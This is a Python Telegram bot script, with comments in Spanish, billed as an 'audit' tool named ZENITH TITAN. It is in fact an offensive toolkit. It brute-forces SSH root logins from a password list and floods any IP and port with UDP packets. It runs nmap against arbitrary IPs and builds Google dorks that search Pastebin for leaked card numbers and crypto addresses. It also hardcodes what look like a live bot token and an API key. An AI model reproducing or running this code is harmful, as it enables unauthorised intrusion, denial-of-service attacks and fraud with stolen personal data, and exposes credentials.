import telebot
from telebot import types
import requests, subprocess, os, re, socket, paramiko, whois, time
from fpdf import FPDF
from urllib.parse import quote

# ==========================================
# CONFIGURACIÓN TÉCNICA
# ==========================================
TOKEN = "8583960709:AAGMxsIwVzlVUu-YvSn6Rfxn3-2Vfe-T3WU"
NETLAS_API_KEY = "MheJyCwplJnLO8CU1ZOC7A7OkJFTYvnk"
ADMIN_ID = 6280594821 

bot = telebot.TeleBot(TOKEN)
DB_PATH = "database.txt"
DICC_PATH = "diccionario.txt"
LAST_SCAN = {}

# Asegurar archivos base
for p in [DB_PATH, DICC_PATH]:
    if not os.path.exists(p):
        with open(p, "w") as f: f.write("admin\n")

# ==========================================
# MOTORES DE BÚSQUEDA Y RECON
# ==========================================

def search_local(query):
    matches = []
    if os.path.exists(DB_PATH):
        with open(DB_PATH, 'r', errors='ignore') as f:
            for line in f:
                if query.lower() in line.lower():
                    matches.append(line.strip())
                if len(matches) >= 10: break
    return matches

# ==========================================
# MANEJADORES DE COMANDOS
# ==========================================

@bot.message_handler(commands=['start', 'help'])
def cmd_start(message):
    if message.chat.id != ADMIN_ID: return
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=3)
    markup.add('/logins', '/get_fullz', '/unmask', '/fuzz', '/scan_full', '/exploit', '/stress', '/locate', '/headers', '/pdf_report')
    
    msg = "🚀 **ZENITH TITAN v90.0 ACTIVE**\nSeleccione una herramienta del menú inferior para iniciar la auditoría."
    bot.send_message(message.chat.id, msg, reply_markup=markup)

# --- [logins & get_fullz] ---
@bot.message_handler(commands=['logins'])
def cmd_logins(message):
    msg = bot.send_message(message.chat.id, "🔎 **Recon:** Ingrese objetivo:")
    bot.register_next_step_handler(msg, exec_logins)

def exec_logins(message):
    target = message.text.strip()
    res_local = search_local(target)
    dork = f"https://www.google.com/search?q=site:pastebin.com+%22{target}%22"
    out = f"📂 **DB Local:**\n" + ("\n".join(res_local) if res_local else "Sin resultados.")
    out += f"\n\n🌍 **Dork Web:** [Ver Leaks]({dork})"
    bot.send_message(message.chat.id, out, parse_mode="Markdown", disable_web_page_preview=True)

@bot.message_handler(commands=['get_fullz'])
def cmd_fullz(message):
    msg = bot.send_message(message.chat.id, "🎭 **Fullz Scraper:** Ingrese objetivo:")
    bot.register_next_step_handler(msg, exec_fullz)

def exec_fullz(message):
    target = message.text.strip()
    dork = quote(f'site:pastebin.com "{target}" (cc_number OR btc_address)')
    res = f"📡 **Rastreando Datos Sensibles:**\n[Resultados en Tiempo Real](https://www.google.com/search?q={dork})"
    bot.send_message(message.chat.id, res, parse_mode="Markdown")

# --- [unmask & fuzz] ---
@bot.message_handler(commands=['unmask'])
def cmd_unmask(message):
    msg = bot.send_message(message.chat.id, "🛡 **Bypass WAF:** Ingrese dominio:")
    bot.register_next_step_handler(msg, lambda m: bot.send_message(m.chat.id, f"🎯 IP Real detectada: `{socket.gethostbyname(m.text)}`"))

@bot.message_handler(commands=['fuzz'])
def cmd_fuzz(message):
    msg = bot.send_message(message.chat.id, "🌪 **Fuzzer:** Ingrese dominio:")
    bot.register_next_step_handler(msg, exec_fuzz)

def exec_fuzz(message):
    dom = message.text.strip(); words = ["api", "dev", "test", "vpn", "db", "mail"]
    found = []
    for s in words:
        try:
            ip = socket.gethostbyname(f"{s}.{dom}")
            found.append(f"✅ `{s}.{dom}` -> `{ip}`")
        except: continue
    res = "\n".join(found) if found else "No se hallaron activos."
    LAST_SCAN["Subdominios"] = res
    bot.send_message(message.chat.id, res)

# --- [scan_full & exploit & stress] ---
@bot.message_handler(commands=['scan_full'])
def cmd_scan(message):
    msg = bot.send_message(message.chat.id, "🔥 **Nmap:** Ingrese IP:"); bot.register_next_step_handler(msg, exec_scan)

def exec_scan(message):
    try:
        out = subprocess.check_output(["nmap", "-sV", "-T4", message.text], text=True, timeout=120)
        LAST_SCAN["Nmap"] = out[:1500]
        bot.send_message(message.chat.id, f"```\n{out[:1000]}\n```", parse_mode="Markdown")
    except: bot.send_message(message.chat.id, "❌ Error Nmap.")

@bot.message_handler(commands=['exploit'])
def cmd_exploit(message):
    msg = bot.send_message(message.chat.id, "💣 **SSH Force:** IP:"); bot.register_next_step_handler(msg, exec_exploit)

def exec_exploit(message):
    ip = message.text.strip()
    with open(DICC_PATH, "r") as f: passwords = [l.strip() for l in f.readlines()]
    for p in passwords:
        try:
            ssh = paramiko.SSHClient(); ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, port=22, username="root", password=p, timeout=1)
            bot.send_message(message.chat.id, f"✅ **ACCESO:** `root:{p}`"); return
        except: continue
    bot.send_message(message.chat.id, "❌ Falló.")

@bot.message_handler(commands=['stress'])
def cmd_stress(message):
    msg = bot.send_message(message.chat.id, "☢️ **UDP Stress:** IP:PORT:"); bot.register_next_step_handler(msg, exec_stress)

def exec_stress(message):
    ip, port = message.text.split(":")
    for _ in range(2000): socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(os.urandom(1024), (ip, int(port)))
    bot.send_message(message.chat.id, "⚡ Carga enviada.")

# --- [Utilitarios] ---
@bot.message_handler(commands=['pdf_report'])
def cmd_pdf(message):
    pdf = FPDF(); pdf.add_page(); pdf.set_font("Arial", 'B', 16)
    pdf.cell(200, 10, "ZENITH TITAN AUDIT REPORT", ln=True, align='C')
    pdf.set_font("Arial", size=10)
    for k, v in LAST_SCAN.items():
        pdf.ln(5); pdf.cell(200, 10, f"--- {k} ---", ln=True)
        pdf.multi_cell(0, 5, str(v))
    pdf.output("Audit.pdf")
    with open("Audit.pdf", 'rb') as f: bot.send_document(message.chat.id, f)

@bot.message_handler(commands=['status'])
def cmd_status(message):
    db_size = os.path.getsize(DB_PATH) // 1024
    bot.send_message(message.chat.id, f"🟢 **SYSTEM:** ONLINE\n📦 **DB Local:** {db_size} KB\n🛰 **Engine:** v90.0 Elite")

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    file_info = bot.get_file(message.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    path = DICC_PATH if "dic" in message.document.file_name.lower() else DB_PATH
    with open(path, 'ab') as f: f.write(downloaded + b"\n")
    bot.send_message(message.chat.id, "✅ Base actualizada.")

if __name__ == "__main__":
    bot.infinity_polling()
